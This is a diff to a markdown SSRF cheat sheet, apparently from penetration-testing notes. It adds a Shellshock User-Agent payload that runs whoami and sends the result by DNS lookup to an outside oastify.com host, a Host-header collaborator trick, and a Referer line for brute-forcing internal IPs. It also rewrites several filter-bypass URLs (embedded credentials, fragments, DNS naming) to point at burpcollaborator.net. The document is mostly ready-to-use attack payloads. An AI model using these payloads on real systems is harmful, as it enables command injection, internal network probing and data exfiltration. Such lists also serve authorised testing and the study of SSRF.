@@ -3,8 +3,18 @@
 http://localhost/
 http://127.0.0.1/
 ```
+## Blind Method
+#### Just place burpcollaborator server in host header
+```txt
+Host: burpcollaborator.net
+```
+#### Shellshock exploitation
+```txt
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).3kobqoj8uv6qbwwlkaf5cvzr1i79v0jp.oastify.com >> Change Uger-Agent info
+Referer: http://192.168.0.$1$:8080 >> Bruteforce the ip
+```
 ## Circumventing common SSRF defenses
-___
+_____________________________________
 ### SSRF with blacklist-based input filters
 ```txt
 http://127.1
@@ -16,17 +26,17 @@ http://spoofed.burpcollaborator.net
 #### You can embed credentials in a URL before the hostname, using the @ character. For example:
 ```txt
     https://expected-host:fakepassword@evil-host
-    https://burpcollaborator.net@evil-host
+    https://expected-host:fakepassword@burpcollaborator.net
 ```
 #### You can use the # character to indicate a URL fragment. For example:
 ```txt
     https://evil-host#expected-host
-    https://evil-host#burpcollaborator.net
+    https://burpcollaborator.net#google.com
 ```
 #### You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
 ```txt
     https://expected-host.evil-host
-    https://burpcollaborator.net.evil-host
+    https://google.com.burpcollaborator.net
 ```
 ### Bypassing SSRF filters via open redirection
 #### For example, the application contains an open redirection vulnerability in which the following URL (http://evil-user.net):
